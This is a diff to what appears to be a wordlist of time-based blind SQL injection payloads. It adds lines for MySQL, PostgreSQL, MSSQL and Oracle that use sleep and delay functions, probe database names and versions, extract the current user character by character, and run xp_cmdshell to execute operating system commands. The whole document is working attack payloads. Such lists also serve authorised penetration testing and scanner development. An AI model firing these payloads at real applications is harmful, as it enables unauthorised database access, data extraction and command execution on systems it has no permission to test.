@@ -143,6 +143,8 @@
 &&SLEEP(20)
 &&SLEEP(20)#
 &&SLEEP(20)--
+' AND (SELECT * FROM (SELECT(SLEEP(20)))ZmTo)--
+' AND (SELECT 1 FROM pg_sleep(20))--
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY) AND '1337' LIKE '1337
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY) AND '1337'='1337
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY) OR '1337'='1337
@@ -301,6 +303,34 @@
 ',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
 ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
 ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'; DECLARE @waitfor VARCHAR(20) SET @waitfor='20:00' WAITFOR TIME @waitfor--
+'; IF (SELECT @@VERSION) LIKE '%Microsoft%' WAITFOR DELAY '00:00:20'--
+'; IF (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 WAITFOR DELAY '00:00:20'--
+'; IF (SELECT DB_NAME())='master' WAITFOR DELAY '00:00:20'--
+'; IF (SELECT OBJECT_ID('tempdb..#x')) IS NOT NULL WAITFOR DELAY '00:00:20'--
+'; IF (SELECT OBJECT_ID('tempdb..#x')) IS NULL WAITFOR DELAY '00:00:20'--
+'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES) WAITFOR DELAY '00:00:20'--
+'; IF EXISTS(SELECT * FROM sys.objects WHERE name='temp'+'name') WAITFOR DELAY '00:00:20'--
+'; IF EXISTS(SELECT 1 FROM sys.databases WHERE name='master') WAITFOR DELAY '00:00:20'--
+'; IF EXISTS(SELECT 1/0 FROM sys.databases WHERE name='master') WAITFOR DELAY '00:00:20'--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--
+'; SELECT pg_sleep(20)--
+'; WAITFOR DELAY '00:00:20'--
+'; WAITFOR DELAY '0:0:20'--
+'; WAITFOR TIME '00:00:20'--
+'; dbms_pipe.receive_message(CHR(66)||CHR(66)||CHR(66),20)--
+'; exec master..xp_cmdshell 'ping 1.1.1.1 -n 1 -w 20000'--
+'; exec master..xp_cmdshell 'sleep 20'--
+'; exec master..xp_cmdshell 'timeout /T 20'--
+'; exec('WAITFOR DELAY ''0:0:20''%00')--
+'; exec('WAITFOR DELAY ''0:0:20''')--
+'; exec('WAITFOR DELAY ''0:0:20''--')--
+'; exec('WAITFOR DELAY ''0:0:20''/*')--
+'; exec('WAITFOR DELAY ''0:0:20'';')--
+'; exec('WAITFOR TIME ''00:00:20''')--
+'; exec('WAITFOR TIME ''00:00:20''--')--
+'; exec('WAITFOR TIME ''00:00:20''/*')--
+'; exec('WAITFOR TIME ''00:00:20'';')--
 ';%20waitfor%20delay%20'0:0:20'%20--%20
 ';WAITFOR DELAY '0:0:20'--
 ';WAITFOR DELAY ‘00:00:20’;--
@@ -429,10 +459,10 @@
 -BENCHMARK(100000000, rand())
 -IF(MID(VERSION(),1,1) = '1', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '2', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '3', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '4', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '20', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '20', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '3', SLEEP(10), 0)
+-IF(MID(VERSION(),1,1) = '4', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '6', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '7', SLEEP(10), 0)
 -IF(MID(VERSION(),1,1) = '8', SLEEP(10), 0)
@@ -442,6 +472,7 @@
 0'XOR(if(now()=sysdate(),sleep(20*1),0))XOR'Z
 0'or(now()=sysdate()&&SLEEP(1))or'Zif(now()=sysdate(),sleep(20),0)/"XOR(if(now()=sysdate(),sleep(20),0))OR"/if(now()=sysdate(),sleep(20),0)/*'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0))OR"*/if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0) and 20=20)"/SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/%2c(select%20*%20from%20(select(sleep(20)))a)
 0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+1 AND (SELECT * FROM (SELECT(SLEEP(20)))ZmTo)
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY) AND (1337=1337
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY)# 1337
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY)-- 1337
@@ -486,9 +517,9 @@
 1)) or sleep(20)#
 1-IF(MID(VERSION(),1,1) = '20', SLEEP(120), 0)
 1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1
+; IF (ASCII(lower(substring((USER),20,1)))<10) WAITFOR DELAY '00:00:20'--
 ; IF (ASCII(lower(substring((USER),3,1)))>1) WAITFOR DELAY '00:00:20'--
 ; IF (ASCII(lower(substring((USER),3,1)))>20) WAITFOR DELAY '00:00:20'--
-; IF (ASCII(lower(substring((USER),20,1)))<10) WAITFOR DELAY '00:00:20'--
 ; IF (LEN(USER)=1) WAITFOR DELAY '00:00:20'--
 ; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:120'
 ; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:20'
@@ -744,8 +775,8 @@ benchmark(200000000,MD20(1))
 benchmark(200000000,MD20(1))#
 benchmark(200000000,MD20(1))--
 desc%2c(select*from(select(sleep(20)))a)
-if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
 if(now()=sysdate(),sleep(20),0)
+if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
 or SELECT SLEEP(20); #
 or SELECT pg_sleep(20);
 or SLEEP(20)
